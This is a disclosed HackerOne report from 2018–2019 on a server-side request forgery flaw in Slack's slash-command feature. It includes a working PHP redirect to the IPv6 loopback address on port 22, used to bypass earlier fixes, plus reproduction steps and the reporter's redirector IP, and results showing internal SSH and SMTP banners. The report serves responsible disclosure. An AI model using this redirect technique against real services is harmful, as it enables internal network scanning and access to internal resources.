# SSRF in api.slack.com, using slash commands and bypassing the protections.

## Report Details
- **Report ID**: 381129
- **URL**: https://hackerone.com/reports/381129
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-07-13T03:38:51.937Z
- **Disclosed**: 2019-02-22T20:58:21.565Z

## Reporter
- **Username**: elber
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: slack

## Vulnerability Information
Bypassing the reports #61312 and #356765

**Tutorial:**


**Go to api.slack.com and create an application with your own slash command.**
{F320014}

**Enter your own domain:**
*in your own domain: index.php*

`<?php
header("location: http://[::]:22/");
?> `

location: http://[::]:22/

{F320019}

And save.

Go to your Slack and type /youslash


Try with my server http://206.189.204.187/


Results:

SSH
{F320015}

SMNTP
{F320016}

## Impact

In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources, and scan for internal ports and get the versions of the services running on the server.
 
Referer: https://www.owasp.org/index.php/Server_Side_Request_Forgery
https://hackerone.com/reports/61312

## Attachments
- slack.png
- request.png
- smntp_ssh.png
- index.png
